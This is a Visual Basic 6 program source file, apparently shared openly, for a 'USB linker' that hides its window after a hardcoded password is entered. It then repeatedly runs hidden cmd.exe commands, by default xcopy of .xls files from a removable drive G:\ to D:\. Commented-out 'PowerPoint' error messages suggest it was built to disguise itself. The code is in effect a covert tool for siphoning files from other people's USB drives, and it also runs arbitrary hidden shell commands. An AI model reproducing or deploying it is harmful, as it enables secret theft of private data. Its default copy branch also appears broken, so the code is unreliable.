VERSION 5.00
Begin VB.Form Form1 
   BorderStyle     =   1  'Fixed Single
   Caption         =   "FileCopy - USB linker v2.0"
   ClientHeight    =   7485
   ClientLeft      =   45
   ClientTop       =   390
   ClientWidth     =   11970
   LinkTopic       =   "Form1"
   MaxButton       =   0   'False
   MinButton       =   0   'False
   ScaleHeight     =   7485
   ScaleWidth      =   11970
   StartUpPosition =   3  '窗口缺省
   Begin VB.Frame Frame1 
      Caption         =   " 运行密码 "
      Height          =   6255
      Left            =   2160
      TabIndex        =   0
      Top             =   6960
      Width           =   7575
      Begin VB.CommandButton Command5 
         Caption         =   "测试(&T)"
         Height          =   375
         Left            =   960
         TabIndex        =   37
         Top             =   2040
         Width           =   1815
      End
      Begin VB.CommandButton Command1 
         Caption         =   "CL"
         Height          =   375
         Index           =   12
         Left            =   2400
         TabIndex        =   32
         Top             =   3480
         Width           =   375
      End
      Begin VB.CommandButton Command1 
         Caption         =   "OK(&E)"
         Height          =   375
         Index           =   11
         Left            =   960
         TabIndex        =   14
         Top             =   3960
         Width           =   1815
      End
      Begin VB.CommandButton Command1 
         Caption         =   "-"
         Height          =   375
         Index           =   10
         Left            =   2400
         TabIndex        =   13
         Top             =   3000
         Width           =   375
      End
      Begin VB.CommandButton Command1 
         Caption         =   "9"
         Height          =   375
         Index           =   9
         Left            =   1920
         TabIndex        =   12
         Top             =   2520
         Width           =   375
      End
      Begin VB.CommandButton Command1 
         Caption         =   "8"
         Height          =   375
         Index           =   8
         Left            =   1440
         TabIndex        =   11
         Top             =   2520
         Width           =   375
      End
      Begin VB.CommandButton Command1 
         Caption         =   "7"
         Height          =   375
         Index           =   7
         Left            =   960
         TabIndex        =   10
         Top             =   2520
         Width           =   375
      End
      Begin VB.CommandButton Command1 
         Caption         =   "6"
         Height          =   375
         Index           =   6
         Left            =   1920
         TabIndex        =   9
         Top             =   3000
         Width           =   375
      End
      Begin VB.CommandButton Command1 
         Caption         =   "5"
         Height          =   375
         Index           =   5
         Left            =   1440
         TabIndex        =   8
         Top             =   3000
         Width           =   375
      End
      Begin VB.CommandButton Command1 
         Caption         =   "4"
         Height          =   375
         Index           =   4
         Left            =   960
         TabIndex        =   7
         Top             =   3000
         Width           =   375
      End
      Begin VB.CommandButton Command1 
         Caption         =   "3"
         Height          =   375
         Index           =   3
         Left            =   1920
         TabIndex        =   6
         Top             =   3480
         Width           =   375
      End
      Begin VB.CommandButton Command1 
         Caption         =   "2"
         Height          =   375
         Index           =   2
         Left            =   1440
         TabIndex        =   5
         Top             =   3480
         Width           =   375
      End
      Begin VB.CommandButton Command1 
         Caption         =   "1"
         Height          =   375
         Index           =   1
         Left            =   960
         TabIndex        =   4
         Top             =   3480
         Width           =   375
      End
      Begin VB.CommandButton Command1 
         Caption         =   "0"
         Height          =   375
         Index           =   0
         Left            =   2400
         TabIndex        =   3
         Top             =   2520
         Width           =   375
      End
      Begin VB.TextBox Text1 
         Height          =   270
         Left            =   960
         TabIndex        =   2
         Top             =   1320
         Width           =   4575
      End
      Begin VB.Label Label7 
         Caption         =   "【关于】 开源许可，源代码开放。进入程序内查看！"
         Height          =   375
         Left            =   960
         TabIndex        =   40
         Top             =   4920
         Width           =   5775
      End
      Begin VB.Label Label6 
         Caption         =   "【声明】 确认进入即代表您同意我国的个人信息保护法和相关法律条规，出现任何损失和纠纷与作者无关。"
         Height          =   495
         Left            =   960
         TabIndex        =   39
         Top             =   4440
         Width           =   6015
      End
      Begin VB.Label Label1 
         Caption         =   "请输入运行时必要的运行密码，以便检验你的身份。"
         Height          =   615
         Left            =   960
         TabIndex        =   1
         Top             =   960
         Width           =   5295
      End
   End
   Begin VB.Frame Frame2 
      Height          =   6615
      Left            =   0
      TabIndex        =   15
      Top             =   0
      Visible         =   0   'False
      Width           =   11775
      Begin VB.Timer Timer1 
         Interval        =   1000
         Left            =   0
         Top             =   6120
      End
      Begin VB.FileListBox File1 
         Height          =   2070
         Left            =   120
         TabIndex        =   24
         Top             =   4080
         Width           =   5055
      End
      Begin VB.DriveListBox Drive1 
         Height          =   300
         Left            =   120
         TabIndex        =   23
         Top             =   1920
         Width           =   5055
      End
      Begin VB.DirListBox Dir1 
         Height          =   1770
         Left            =   120
         TabIndex        =   22
         Top             =   2280
         Width           =   5055
      End
      Begin VB.Frame Frame6 
         Caption         =   " 高级 "
         Height          =   3255
         Left            =   5280
         TabIndex        =   21
         Top             =   3000
         Width           =   6375
         Begin VB.CommandButton Command6 
            Caption         =   "查看复制命令使用方法"
            Height          =   375
            Left            =   1920
            TabIndex        =   38
            Top             =   1080
            Width           =   2175
         End
         Begin VB.CheckBox Check1 
            Caption         =   "运行自定义命令"
            Height          =   255
            Left            =   240
            TabIndex        =   36
            Top             =   1560
            Width           =   1695
         End
         Begin VB.TextBox Text6 
            Height          =   270
            Left            =   840
            TabIndex        =   34
            Text            =   "xcopy G:\*.xls D:\"
            Top             =   1920
            Width           =   5415
         End
         Begin VB.Label Label5 
            Caption         =   "命令行"
            Height          =   255
            Left            =   240
            TabIndex        =   35
            Top             =   1920
            Width           =   615
         End
         Begin VB.Label Label2 
            Caption         =   "    我们不建议您改动高级设置，如果不需要的话。 您如果需要运行多个命令可以多次启动本应用。"
            Height          =   495
            Left            =   360
            TabIndex        =   33
            Top             =   480
            Width           =   5775
         End
      End
      Begin VB.Frame Frame5 
         Caption         =   " 定时关闭 / 次数限制 "
         Height          =   975
         Left            =   5280
         TabIndex        =   20
         Top             =   1920
         Width           =   6375
         Begin VB.TextBox Text5 
            Height          =   270
            Left            =   240
            TabIndex        =   29
            Text            =   "600"
            Top             =   480
            Width           =   1215
         End
         Begin VB.Label Label4 
            Caption         =   "秒关闭程序"
            Height          =   375
            Left            =   1560
            TabIndex        =   30
            Top             =   480
            Width           =   1215
         End
      End
      Begin VB.Frame Frame4 
         Caption         =   " 刷新频率 "
         Height          =   1575
         Left            =   5280
         TabIndex        =   19
         Top             =   240
         Width           =   6375
         Begin VB.CommandButton Command4 
            Caption         =   "开始隐藏运行"
            Height          =   495
            Left            =   1080
            TabIndex        =   31
            Top             =   720
            Width           =   1575
         End
         Begin VB.TextBox Text4 
            Height          =   270
            Left            =   240
            TabIndex        =   27
            Text            =   "60"
            Top             =   360
            Width           =   1215
         End
         Begin VB.Label Label3 
            Caption         =   "秒 / 次"
            Height          =   255
            Left            =   1560
            TabIndex        =   28
            Top             =   360
            Width           =   1215
         End
      End
      Begin VB.Frame Frame3 
         Caption         =   " 从……到…… "
         Height          =   1575
         Left            =   120
         TabIndex        =   16
         Top             =   240
         Width           =   5055
         Begin VB.CommandButton Command3 
            Caption         =   "OK"
            Height          =   225
            Left            =   4440
            TabIndex        =   26
            Top             =   720
            Width           =   495
         End
         Begin VB.CommandButton Command2 
            Caption         =   "OK"
            Height          =   255
            Left            =   4440
            TabIndex        =   25
            Top             =   360
            Width           =   495
         End
         Begin VB.TextBox Text3 
            Height          =   270
            Left            =   120
            TabIndex        =   18
            Text            =   "G:\"
            Top             =   360
            Width           =   4215
         End
         Begin VB.TextBox Text2 
            Height          =   270
            Left            =   120
            TabIndex        =   17
            Text            =   "D:\"
            Top             =   720
            Width           =   4215
         End
      End
      Begin VB.Label Label8 
         Caption         =   "项目开源地址：https://github.com/Sun-ZhenXing/VB-Project/FileCopy"
         Height          =   255
         Left            =   1800
         TabIndex        =   41
         Top             =   6240
         Width           =   7575
      End
   End
End
Attribute VB_Name = "Form1"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = False
Dim OK As Integer
Dim times As Integer


Private Sub Command1_Click(index As Integer)
    On Error Resume Next
    If index <= 10 Then
        Text1.Text = Text1.Text & Command1(index).Caption
    End If
    If index = 11 Then
        If Text1.Text = "1-2-3-4-5" Then
            Frame1.Visible = False
            Frame2.Visible = True
        Else
            MsgBox "密码错误！", , "系统提示"
            Text1.SetFocus
        End If
    End If
    If index = 12 Then
        Text1.Text = ""
    End If
End Sub

Private Sub Command2_Click()
    Command3.Enabled = True
    Command2.Enabled = False
End Sub

Private Sub Command3_Click()
    Command3.Enabled = False
    Command2.Enabled = True
End Sub

Private Sub Command4_Click()
    OK = 1
    Me.Visible = False
End Sub

Private Sub Command6_Click()
    Shell "cmd.exe /K help xcopy", vbMaximizedFocus
End Sub

Private Sub Dir1_Change()
    File1 = Dir1
    If Command2.Enabled Then
        Text2.Text = Dir1
    Else
        Text3.Text = Dir1
    End If
End Sub

Private Sub Drive1_Change()
    Dir1 = Drive1
    File1 = Drive1
End Sub

Private Sub Form_Load()
    On Error Resume Next
    OK = 0
    times = 0
    Frame2.Visible = False
    Frame1.Left = 0
    Frame1.Top = 0
    Command2.Enabled = False
End Sub

Private Sub Timer1_Timer()
    On Error Resume Next
    If OK = 1 Then times = times + 1
    If OK <> 0 Then
        If times Mod Int(Text4.Text) = 0 Then
            'MsgBox "出现错误！", , "PowerPoint"
            If Check1.Value Then
                Shell "cmd.exe /c " & Text6.Text, vbHide
            Else
                Shell "cmd.exe /c " & Text3.Text & " " & Text2.Text, vbHide
            End If
        End If
        If times Mod Int(Text5.Text) = 0 Then
            'MsgBox "退出异常！", , "PowerPoint"
            End
        End If
    End If
End Sub






















